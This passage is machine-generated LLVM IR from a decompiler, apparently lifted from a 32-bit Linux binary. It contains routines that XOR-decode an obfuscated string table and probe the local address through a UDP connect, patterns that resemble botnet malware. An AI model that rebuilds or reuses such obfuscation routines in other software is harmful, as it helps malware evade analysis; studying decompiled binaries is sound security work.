  uselistorder label %dec_label_pc_804f1db, { 5, 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_804f1ba, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f1a7, { 1, 0 }
  uselistorder label %dec_label_pc_804f195, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804f169, { 1, 0 }
  uselistorder label %dec_label_pc_804f169.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804f13c, { 1, 0 }
  uselistorder label %dec_label_pc_804f137, { 1, 0 }
  uselistorder label %dec_label_pc_804f0f5, { 1, 0 }
  uselistorder label %dec_label_pc_804f0e1, { 1, 0 }
  uselistorder label %dec_label_pc_804f0b8, { 1, 0 }
  uselistorder label %dec_label_pc_804efdb, { 5, 6, 0, 7, 2, 4, 1, 3 }
  uselistorder label %dec_label_pc_804efc0, { 1, 0 }
  uselistorder label %dec_label_pc_804ef97, { 1, 0 }
  uselistorder label %dec_label_pc_804eeb1, { 3, 4, 5, 0, 1, 6, 2 }
  uselistorder label %dec_label_pc_804ee80, { 1, 0 }
  uselistorder label %dec_label_pc_804ee55, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ee10, { 1, 0 }
  uselistorder label %dec_label_pc_804ed2d, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder label %dec_label_pc_804ed22, { 1, 0 }
  uselistorder label %dec_label_pc_804ec0f, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804ebff.thread, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ea53, { 1, 0 }
  uselistorder label %dec_label_pc_804e883, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804e863.dec_label_pc_804e883_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804e7f3, { 1, 0 }
  uselistorder label %dec_label_pc_804e7b9, { 1, 0 }
  uselistorder label %dec_label_pc_804e303, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804e2e9, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e29f, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804e26b, { 0, 4, 1, 2, 3 }
  uselistorder label %dec_label_pc_804e233, { 1, 0 }
  uselistorder label %dec_label_pc_804e1f4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e164, { 1, 0 }
  uselistorder label %dec_label_pc_804e14d, { 1, 0 }
  uselistorder label %dec_label_pc_804e118, { 1, 0 }
  uselistorder label %dec_label_pc_804e107, { 1, 0 }
  uselistorder label %dec_label_pc_804e0f6, { 1, 0 }
  uselistorder label %dec_label_pc_804e0d6, { 1, 0 }
  uselistorder label %dec_label_pc_804df83, { 1, 0 }
  uselistorder label %dec_label_pc_804df59, { 1, 0 }
  uselistorder label %dec_label_pc_804de41, { 148, 29, 149, 150, 151, 152, 153, 154, 159, 42, 43, 45, 48, 49, 51, 160, 56, 161, 162, 57, 58, 163, 155, 59, 156, 164, 165, 166, 167, 61, 62, 20, 63, 64, 70, 72, 1, 73, 75, 76, 77, 21, 78, 168, 79, 157, 158, 80, 169, 0, 170, 81, 74, 171, 172, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 82, 173, 83, 174, 84, 71, 66, 65, 69, 68, 85, 67, 22, 23, 25, 24, 26, 86, 28, 27, 30, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 87, 44, 40, 39, 88, 89, 90, 41, 219, 31, 32, 33, 34, 35, 36, 37, 91, 38, 46, 47, 50, 92, 53, 52, 54, 93, 55, 218, 2, 185, 186, 95, 94, 187, 188, 189, 190, 97, 96, 191, 98, 99, 100, 101, 102, 192, 103, 104, 105, 193, 106, 107, 108, 109, 110, 111, 112, 113, 194, 114, 3, 115, 60, 4, 116, 195, 196, 197, 198, 199, 200, 201, 202, 117, 203, 204, 205, 118, 206, 207, 208, 209, 210, 211, 212, 119, 213, 5, 6, 7, 8, 122, 121, 120, 123, 214, 215, 216, 124, 217, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 147, 146, 220 }
}

define i32 @function_80503c0() local_unnamed_addr {
dec_label_pc_80503c0:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v1_80503c8 = icmp eq i32 %tmp, 0
  %v1_80503ca = mul i32 %tmp2, 8
  store i32 %v1_80503ca, i32* %edx.global-to-local, align 4
  br i1 %v1_80503c8, label %dec_label_pc_80503e3, label %dec_label_pc_80503d9

dec_label_pc_80503d9:                             ; preds = %dec_label_pc_80503c0
  %v1_80503d9 = add i32 %v1_80503ca, add (i32 ptrtoint (i32* @global_var_80551a0.27 to i32), i32 4)
  %v2_80503d9 = inttoptr i32 %v1_80503d9 to i32*
  %v3_80503d9 = load i32, i32* %v2_80503d9, align 4
  %v1_80503dc = urem i32 %v3_80503d9, 65536
  %v2_80503e1 = inttoptr i32 %tmp to i32*
  store i32 %v1_80503dc, i32* %v2_80503e1, align 4
  %v0_80503e3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80503e3

dec_label_pc_80503e3:                             ; preds = %dec_label_pc_80503c0, %dec_label_pc_80503d9
  %v0_80503e3 = phi i32 [ %v1_80503ca, %dec_label_pc_80503c0 ], [ %v0_80503e3.pre, %dec_label_pc_80503d9 ]
  %v1_80503e3 = add i32 %v0_80503e3, ptrtoint (i32* @global_var_80551a0.27 to i32)
  %v2_80503e3 = inttoptr i32 %v1_80503e3 to i32*
  %v3_80503e3 = load i32, i32* %v2_80503e3, align 4
  ret i32 %v3_80503e3

; uselistorder directives
  uselistorder label %dec_label_pc_80503e3, { 1, 0 }
}

define i32 @function_80503f0() local_unnamed_addr {
dec_label_pc_80503f0:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %v4_80503f9 = zext i8 %tmp to i32
  %v1_80503fd = mul nuw nsw i32 %v4_80503f9, 8
  %v2_80503fd = add i32 %v1_80503fd, ptrtoint (i32* @global_var_80551a0.27 to i32)
  store i32 %v2_80503fd, i32* %ecx.global-to-local, align 4
  %v0_8050404 = load i16, i16* @global_var_8055038.28, align 2
  %v1_8050404 = sext i16 %v0_8050404 to i32
  %v1_8050409 = add i32 %v1_80503fd, add (i32 ptrtoint (i32* @global_var_80551a0.27 to i32), i32 4)
  %v2_8050409 = inttoptr i32 %v1_8050409 to i16*
  %v3_8050409 = load i16, i16* %v2_8050409, align 4
  %v4_8050409 = icmp eq i16 %v3_8050409, 0
  br i1 %v4_8050409, label %dec_label_pc_805045a, label %dec_label_pc_8050410

dec_label_pc_8050410:                             ; preds = %dec_label_pc_80503f0
  store i32 %v1_8050404, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8050418 = udiv i32 %v1_8050404, 16777216
  %v2_805041b = udiv i32 %v1_8050404, 256
  store i32 %v2_805041b, i32* %edi.global-to-local, align 4
  %v5_805041e = trunc i32 %v2_8050418 to i8
  store i8 %v5_805041e, i8* %stack_var_-44, align 1
  %v2_8050421 = udiv i32 %v1_8050404, 65536
  store i32 %v2_8050421, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050424

dec_label_pc_8050424:                             ; preds = %dec_label_pc_8050424.dec_label_pc_8050424_crit_edge, %dec_label_pc_8050410
  %v0_805042a = phi i32 [ %v0_805042a.pre, %dec_label_pc_8050424.dec_label_pc_8050424_crit_edge ], [ %v1_8050404, %dec_label_pc_8050410 ]
  %v0_8050426 = phi i32 [ %v1_8050456, %dec_label_pc_8050424.dec_label_pc_8050424_crit_edge ], [ 0, %dec_label_pc_8050410 ]
  %v0_8050424 = phi i32 [ %v0_805044e, %dec_label_pc_8050424.dec_label_pc_8050424_crit_edge ], [ %v2_80503fd, %dec_label_pc_8050410 ]
  %v1_8050424 = inttoptr i32 %v0_8050424 to i32*
  %v2_8050424 = load i32, i32* %v1_8050424, align 4
  %v2_8050428 = add i32 %v2_8050424, %v0_8050426
  %v1_805042c = inttoptr i32 %v2_8050428 to i8*
  %v2_805042c = load i8, i8* %v1_805042c, align 1
  %v4_805042c = trunc i32 %v0_805042a to i8
  %v5_805042c = xor i8 %v2_805042c, %v4_805042c
  store i8 %v5_805042c, i8* %v1_805042c, align 1
  %v0_805042e = load i32, i32* %edx.global-to-local, align 4
  %v0_8050430 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050430 = inttoptr i32 %v0_8050430 to i32*
  %v2_8050430 = load i32, i32* %v1_8050430, align 4
  %v2_8050432 = add i32 %v2_8050430, %v0_805042e
  %v0_8050434 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050436 = inttoptr i32 %v2_8050432 to i8*
  %v2_8050436 = load i8, i8* %v1_8050436, align 1
  %v4_8050436 = trunc i32 %v0_8050434 to i8
  %v5_8050436 = xor i8 %v2_8050436, %v4_8050436
  store i8 %v5_8050436, i8* %v1_8050436, align 1
  %v0_8050438 = load i32, i32* %edx.global-to-local, align 4
  %v0_805043a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805043a = inttoptr i32 %v0_805043a to i32*
  %v2_805043a = load i32, i32* %v1_805043a, align 4
  %v2_805043c = add i32 %v2_805043a, %v0_8050438
  %v0_805043e = load i32, i32* %esi.global-to-local, align 4
  %v1_8050440 = inttoptr i32 %v2_805043c to i8*
  %v2_8050440 = load i8, i8* %v1_8050440, align 1
  %v4_8050440 = trunc i32 %v0_805043e to i8
  %v5_8050440 = xor i8 %v2_8050440, %v4_8050440
  store i8 %v5_8050440, i8* %v1_8050440, align 1
  %v0_8050442 = load i32, i32* %edx.global-to-local, align 4
  %v0_8050444 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050444 = inttoptr i32 %v0_8050444 to i32*
  %v2_8050444 = load i32, i32* %v1_8050444, align 4
  %v1_8050446 = add i32 %v0_8050442, 1
  store i32 %v1_8050446, i32* %edx.global-to-local, align 4
  %v2_8050447 = add i32 %v2_8050444, %v0_8050442
  %v2_8050449 = load i8, i8* %stack_var_-44, align 1
  %v1_805044c = inttoptr i32 %v2_8050447 to i8*
  %v2_805044c = load i8, i8* %v1_805044c, align 1
  %v5_805044c = xor i8 %v2_805044c, %v2_8050449
  store i8 %v5_805044c, i8* %v1_805044c, align 1
  %v0_805044e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805044e = add i32 %v0_805044e, 4
  %v2_805044e = inttoptr i32 %v1_805044e to i32*
  %v3_805044e = load i32, i32* %v2_805044e, align 4
  %v1_8050451 = urem i32 %v3_805044e, 65536
  %v1_8050456 = load i32, i32* %edx.global-to-local, align 4
  %v8_8050458 = icmp sgt i32 %v1_8050451, %v1_8050456
  br i1 %v8_8050458, label %dec_label_pc_8050424.dec_label_pc_8050424_crit_edge, label %dec_label_pc_805045a

dec_label_pc_8050424.dec_label_pc_8050424_crit_edge: ; preds = %dec_label_pc_8050424
  %v0_805042a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050424

dec_label_pc_805045a:                             ; preds = %dec_label_pc_8050424, %dec_label_pc_80503f0
  %v0_8050461 = phi i32 [ %v1_8050404, %dec_label_pc_80503f0 ], [ %v1_8050451, %dec_label_pc_8050424 ]
  ret i32 %v0_8050461

; uselistorder directives
  uselistorder i32 %v1_8050456, { 1, 0 }
  uselistorder i32 %v1_8050451, { 1, 0 }
  uselistorder i32 %v0_805044e, { 1, 0 }
  uselistorder i32 %v1_8050404, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @function_8050470() local_unnamed_addr {
dec_label_pc_8050470:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %v4_8050479 = zext i8 %tmp to i32
  %v1_805047d = mul nuw nsw i32 %v4_8050479, 8
  %v2_805047d = add i32 %v1_805047d, ptrtoint (i32* @global_var_80551a0.27 to i32)
  store i32 %v2_805047d, i32* %ecx.global-to-local, align 4
  %v0_8050484 = load i16, i16* @global_var_8055038.28, align 2
  %v1_8050484 = sext i16 %v0_8050484 to i32
  %v1_8050489 = add i32 %v1_805047d, add (i32 ptrtoint (i32* @global_var_80551a0.27 to i32), i32 4)
  %v2_8050489 = inttoptr i32 %v1_8050489 to i16*
  %v3_8050489 = load i16, i16* %v2_8050489, align 4
  %v4_8050489 = icmp eq i16 %v3_8050489, 0
  br i1 %v4_8050489, label %dec_label_pc_80504da, label %dec_label_pc_8050490

dec_label_pc_8050490:                             ; preds = %dec_label_pc_8050470
  store i32 %v1_8050484, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v2_8050498 = udiv i32 %v1_8050484, 16777216
  %v2_805049b = udiv i32 %v1_8050484, 256
  store i32 %v2_805049b, i32* %edi.global-to-local, align 4
  %v5_805049e = trunc i32 %v2_8050498 to i8
  store i8 %v5_805049e, i8* %stack_var_-44, align 1
  %v2_80504a1 = udiv i32 %v1_8050484, 65536
  store i32 %v2_80504a1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80504a4

dec_label_pc_80504a4:                             ; preds = %dec_label_pc_80504a4.dec_label_pc_80504a4_crit_edge, %dec_label_pc_8050490
  %v0_80504aa = phi i32 [ %v0_80504aa.pre, %dec_label_pc_80504a4.dec_label_pc_80504a4_crit_edge ], [ %v1_8050484, %dec_label_pc_8050490 ]
  %v0_80504a6 = phi i32 [ %v1_80504d6, %dec_label_pc_80504a4.dec_label_pc_80504a4_crit_edge ], [ 0, %dec_label_pc_8050490 ]
  %v0_80504a4 = phi i32 [ %v0_80504ce, %dec_label_pc_80504a4.dec_label_pc_80504a4_crit_edge ], [ %v2_805047d, %dec_label_pc_8050490 ]
  %v1_80504a4 = inttoptr i32 %v0_80504a4 to i32*
  %v2_80504a4 = load i32, i32* %v1_80504a4, align 4
  %v2_80504a8 = add i32 %v2_80504a4, %v0_80504a6
  %v1_80504ac = inttoptr i32 %v2_80504a8 to i8*
  %v2_80504ac = load i8, i8* %v1_80504ac, align 1
  %v4_80504ac = trunc i32 %v0_80504aa to i8
  %v5_80504ac = xor i8 %v2_80504ac, %v4_80504ac
  store i8 %v5_80504ac, i8* %v1_80504ac, align 1
  %v0_80504ae = load i32, i32* @edx, align 4
  %v0_80504b0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80504b0 = inttoptr i32 %v0_80504b0 to i32*
  %v2_80504b0 = load i32, i32* %v1_80504b0, align 4
  %v2_80504b2 = add i32 %v2_80504b0, %v0_80504ae
  %v0_80504b4 = load i32, i32* %edi.global-to-local, align 4
  %v1_80504b6 = inttoptr i32 %v2_80504b2 to i8*
  %v2_80504b6 = load i8, i8* %v1_80504b6, align 1
  %v4_80504b6 = trunc i32 %v0_80504b4 to i8
  %v5_80504b6 = xor i8 %v2_80504b6, %v4_80504b6
  store i8 %v5_80504b6, i8* %v1_80504b6, align 1
  %v0_80504b8 = load i32, i32* @edx, align 4
  %v0_80504ba = load i32, i32* %ecx.global-to-local, align 4
  %v1_80504ba = inttoptr i32 %v0_80504ba to i32*
  %v2_80504ba = load i32, i32* %v1_80504ba, align 4
  %v2_80504bc = add i32 %v2_80504ba, %v0_80504b8
  %v0_80504be = load i32, i32* %esi.global-to-local, align 4
  %v1_80504c0 = inttoptr i32 %v2_80504bc to i8*
  %v2_80504c0 = load i8, i8* %v1_80504c0, align 1
  %v4_80504c0 = trunc i32 %v0_80504be to i8
  %v5_80504c0 = xor i8 %v2_80504c0, %v4_80504c0
  store i8 %v5_80504c0, i8* %v1_80504c0, align 1
  %v0_80504c2 = load i32, i32* @edx, align 4
  %v0_80504c4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80504c4 = inttoptr i32 %v0_80504c4 to i32*
  %v2_80504c4 = load i32, i32* %v1_80504c4, align 4
  %v1_80504c6 = add i32 %v0_80504c2, 1
  store i32 %v1_80504c6, i32* @edx, align 4
  %v2_80504c7 = add i32 %v2_80504c4, %v0_80504c2
  %v2_80504c9 = load i8, i8* %stack_var_-44, align 1
  %v1_80504cc = inttoptr i32 %v2_80504c7 to i8*
  %v2_80504cc = load i8, i8* %v1_80504cc, align 1
  %v5_80504cc = xor i8 %v2_80504cc, %v2_80504c9
  store i8 %v5_80504cc, i8* %v1_80504cc, align 1
  %v0_80504ce = load i32, i32* %ecx.global-to-local, align 4
  %v1_80504ce = add i32 %v0_80504ce, 4
  %v2_80504ce = inttoptr i32 %v1_80504ce to i32*
  %v3_80504ce = load i32, i32* %v2_80504ce, align 4
  %v1_80504d1 = urem i32 %v3_80504ce, 65536
  %v1_80504d6 = load i32, i32* @edx, align 4
  %v8_80504d8 = icmp sgt i32 %v1_80504d1, %v1_80504d6
  br i1 %v8_80504d8, label %dec_label_pc_80504a4.dec_label_pc_80504a4_crit_edge, label %dec_label_pc_80504da

dec_label_pc_80504a4.dec_label_pc_80504a4_crit_edge: ; preds = %dec_label_pc_80504a4
  %v0_80504aa.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80504a4

dec_label_pc_80504da:                             ; preds = %dec_label_pc_80504a4, %dec_label_pc_8050470
  %v0_80504e1 = phi i32 [ %v1_8050484, %dec_label_pc_8050470 ], [ %v1_80504d1, %dec_label_pc_80504a4 ]
  ret i32 %v0_80504e1

; uselistorder directives
  uselistorder i32 %v1_80504d6, { 1, 0 }
  uselistorder i32 %v1_80504d1, { 1, 0 }
  uselistorder i32 %v0_80504ce, { 1, 0 }
  uselistorder i32 %v1_8050484, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80551a0.27 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_8055038.28, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80551a0.27 to i32), { 1, 2, 3, 0 }
}

define i32 @function_8050ad0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050ad0:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8050ad8 = icmp eq i32 %arg2, 0
  br i1 %v1_8050ad8, label %dec_label_pc_8050ad0.dec_label_pc_8050ae9_crit_edge, label %dec_label_pc_8050adc

dec_label_pc_8050ad0.dec_label_pc_8050ae9_crit_edge: ; preds = %dec_label_pc_8050ad0
  %v0_8050ae9.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8050ae9

dec_label_pc_8050adc:                             ; preds = %dec_label_pc_8050ad0
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8050ae05 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_8050ae05, align 1
  %v0_8050ae46 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ae47 = add i32 %v0_8050ae46, 1
  store i32 %v1_8050ae47, i32* %eax.global-to-local, align 4
  %v12_8050ae58 = icmp eq i32 %v1_8050ae47, %arg2
  %v1_8050ae79 = icmp eq i1 %v12_8050ae58, false
  br i1 %v1_8050ae79, label %dec_label_pc_8050ae0.dec_label_pc_8050ae0_crit_edge, label %dec_label_pc_8050ae9

dec_label_pc_8050ae0.dec_label_pc_8050ae0_crit_edge: ; preds = %dec_label_pc_8050adc, %dec_label_pc_8050ae0.dec_label_pc_8050ae0_crit_edge
  %v1_8050ae410 = phi i32 [ %v1_8050ae4, %dec_label_pc_8050ae0.dec_label_pc_8050ae0_crit_edge ], [ %v1_8050ae47, %dec_label_pc_8050adc ]
  %v1_8050ae0.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050ae0 = add i32 %v1_8050ae410, %v1_8050ae0.pre
  %v3_8050ae0 = inttoptr i32 %v2_8050ae0 to i8*
  store i8 0, i8* %v3_8050ae0, align 1
  %v0_8050ae4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ae4 = add i32 %v0_8050ae4, 1
  store i32 %v1_8050ae4, i32* %eax.global-to-local, align 4
  %v12_8050ae5 = icmp eq i32 %v1_8050ae4, %arg2
  %v1_8050ae7 = icmp eq i1 %v12_8050ae5, false
  br i1 %v1_8050ae7, label %dec_label_pc_8050ae0.dec_label_pc_8050ae0_crit_edge, label %dec_label_pc_8050ae9

dec_label_pc_8050ae9:                             ; preds = %dec_label_pc_8050adc, %dec_label_pc_8050ae0.dec_label_pc_8050ae0_crit_edge, %dec_label_pc_8050ad0.dec_label_pc_8050ae9_crit_edge
  %v0_8050ae9 = phi i32 [ %v0_8050ae9.pre, %dec_label_pc_8050ad0.dec_label_pc_8050ae9_crit_edge ], [ %v1_8050ae47, %dec_label_pc_8050adc ], [ %v1_8050ae4, %dec_label_pc_8050ae0.dec_label_pc_8050ae0_crit_edge ]
  ret i32 %v0_8050ae9

; uselistorder directives
  uselistorder i32 %v1_8050ae4, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050ae9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050ae0.dec_label_pc_8050ae0_crit_edge, { 1, 0 }
}

define i32 @function_8050af0() local_unnamed_addr {
dec_label_pc_8050af0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %v7_8050b05 = icmp sgt i32 %tmp9, %tmp10
  %tmp17 = icmp slt i32 %tmp10, 1
  %or.cond = or i1 %v7_8050b05, %tmp17
  br i1 %or.cond, label %dec_label_pc_8050b0a, label %dec_label_pc_8050b14

dec_label_pc_8050b0a:                             ; preds = %dec_label_pc_8050b22, %dec_label_pc_8050b35, %dec_label_pc_8050af0
  %storemerge = phi i32 [ -1, %dec_label_pc_8050af0 ], [ -1, %dec_label_pc_8050b22 ], [ %v0_8050b23, %dec_label_pc_8050b35 ]
  ret i32 %storemerge

dec_label_pc_8050b14:                             ; preds = %dec_label_pc_8050af0
  %v2_8050b2c = add i32 %tmp, -1
  br label %dec_label_pc_8050b28

dec_label_pc_8050b20:                             ; preds = %dec_label_pc_8050b28
  br label %dec_label_pc_8050b22

dec_label_pc_8050b22:                             ; preds = %dec_label_pc_8050b35, %dec_label_pc_8050b20
  %v2_8050b303 = phi i32 [ %v1_8050b35, %dec_label_pc_8050b35 ], [ 0, %dec_label_pc_8050b20 ]
  %v1_8050b22 = add i32 %v0_8050b22, 1
  %v1_8050b23 = add i32 %v0_8050b23, 1
  %v12_8050b24 = icmp eq i32 %tmp10, %v1_8050b22
  br i1 %v12_8050b24, label %dec_label_pc_8050b0a, label %dec_label_pc_8050b28

dec_label_pc_8050b28:                             ; preds = %dec_label_pc_8050b22, %dec_label_pc_8050b14
  %v0_8050b22 = phi i32 [ %v1_8050b22, %dec_label_pc_8050b22 ], [ 0, %dec_label_pc_8050b14 ]
  %v0_8050b35 = phi i32 [ %v2_8050b303, %dec_label_pc_8050b22 ], [ 0, %dec_label_pc_8050b14 ]
  %v0_8050b23 = phi i32 [ %v1_8050b23, %dec_label_pc_8050b22 ], [ 1, %dec_label_pc_8050b14 ]
  %v3_8050b2c = add i32 %v2_8050b2c, %v0_8050b23
  %v4_8050b2c = inttoptr i32 %v3_8050b2c to i8*
  %v5_8050b2c = load i8, i8* %v4_8050b2c, align 1
  %v4_8050b30 = add i32 %v0_8050b35, %tmp8
  %v5_8050b30 = inttoptr i32 %v4_8050b30 to i8*
  %v6_8050b30 = load i8, i8* %v5_8050b30, align 1
  %v17_8050b30 = icmp eq i8 %v5_8050b2c, %v6_8050b30
  %v1_8050b33 = icmp eq i1 %v17_8050b30, false
  br i1 %v1_8050b33, label %dec_label_pc_8050b20, label %dec_label_pc_8050b35

dec_label_pc_8050b35:                             ; preds = %dec_label_pc_8050b28
  %v1_8050b35 = add i32 %v0_8050b35, 1
  %v12_8050b36 = icmp eq i32 %tmp9, %v1_8050b35
  %v1_8050b38 = icmp eq i1 %v12_8050b36, false
  br i1 %v1_8050b38, label %dec_label_pc_8050b22, label %dec_label_pc_8050b0a

; uselistorder directives
  uselistorder i32 %v0_8050b23, { 2, 0, 1 }
  uselistorder i32 %v0_8050b35, { 1, 0 }
  uselistorder i32 %v1_8050b22, { 1, 0 }
  uselistorder i32 %tmp10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050b0a, { 1, 0, 2 }
}

define i32 @function_8050cb0() local_unnamed_addr {
dec_label_pc_8050cb0:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v1_8050cbd = call i32 @function_805149b(i32 16)
  %v1_8050cc2 = inttoptr i32 %v1_8050cbd to i32*
  store i32 0, i32* %v1_8050cc2, align 4
  %v4_8050ccf = call i32 @function_8051747(i32 2, i32 2, i32 0, i32 %v1_8050cbd)
  store i32 %v4_8050ccf, i32* %esi.global-to-local, align 4
  %v10_8050cdb = icmp eq i32 %v4_8050ccf, -1
  br i1 %v10_8050cdb, label %dec_label_pc_8050d22, label %dec_label_pc_8050ce0

dec_label_pc_8050ce0:                             ; preds = %dec_label_pc_8050cb0
  %v2_8050ce0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8050ce0, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v3_8050cff = call i32 @function_805156c(i32 %v4_8050ccf, i32 %v2_8050ce0, i32 16)
  %v2_8050d07 = ptrtoint i32* %stack_var_-12 to i32
  %v0_8050d0d = load i32, i32* %esi.global-to-local, align 4
  %v3_8050d0e = call i32 @function_8051597(i32 %v0_8050d0d, i32 %v2_8050ce0, i32 %v2_8050d07)
  %v1_8050d16 = call i32 @function_8050f63(i32 %v0_8050d0d)
  br label %dec_label_pc_8050d22

dec_label_pc_8050d22:                             ; preds = %dec_label_pc_8050cb0, %dec_label_pc_8050ce0
  %v0_8050d27 = phi i32 [ 0, %dec_label_pc_8050cb0 ], [ 134744072, %dec_label_pc_8050ce0 ]
  ret i32 %v0_8050d27

; uselistorder directives
  uselistorder i32 %v4_8050ccf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_805156c, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8051747, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050d22, { 1, 0 }
}

define i32 @function_8050ecd(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050ecd:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8050ecd = load i32, i32* @edi, align 4
  %v0_8050ece = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8050ee2 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_8050eec = icmp ugt i32 %v1_8050ee2, 2
  br i1 %v6_8050eec, label %dec_label_pc_8050efc, label %dec_label_pc_8050eee

dec_label_pc_8050eee:                             ; preds = %dec_label_pc_8050ecd
  %v4_8050ef2 = call i32 @function_8050f24(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8050ee2)
  br label %dec_label_pc_8050f1e

dec_label_pc_8050efc:                             ; preds = %dec_label_pc_8050ecd
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8050f04 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8050f04, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_8050f04, -4095
  br i1 %tmp17, label %dec_label_pc_8050f1c, label %dec_label_pc_8050f10

dec_label_pc_8050f10:                             ; preds = %dec_label_pc_8050efc
  %v1_8050f10 = call i32 @function_805149b(i32 %v0_8050ece)
  %v0_8050f15 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050f15 = sub i32 0, %v0_8050f15
  %v2_8050f17 = inttoptr i32 %v1_8050f10 to i32*
  store i32 %v1_8050f15, i32* %v2_8050f17, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050f1c

dec_label_pc_8050f1c:                             ; preds = %dec_label_pc_8050efc, %dec_label_pc_8050f10
  %v0_8050f1c = phi i32 [ %v2_8050f04, %dec_label_pc_8050efc ], [ -1, %dec_label_pc_8050f10 ]
  br label %dec_label_pc_8050f1e

dec_label_pc_8050f1e:                             ; preds = %dec_label_pc_8050eee, %dec_label_pc_8050f1c
  %v0_8050f23 = phi i32 [ %v4_8050ef2, %dec_label_pc_8050eee ], [ %v0_8050f1c, %dec_label_pc_8050f1c ]
  store i32 %v0_8050ece, i32* @ebx, align 4
  store i32 %v0_8050ecd, i32* @edi, align 4
  ret i32 %v0_8050f23

; uselistorder directives
  uselistorder i32 %v2_8050f04, { 1, 0, 2 }
  uselistorder i32 %v0_8050ece, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8050f1e, { 1, 0 }
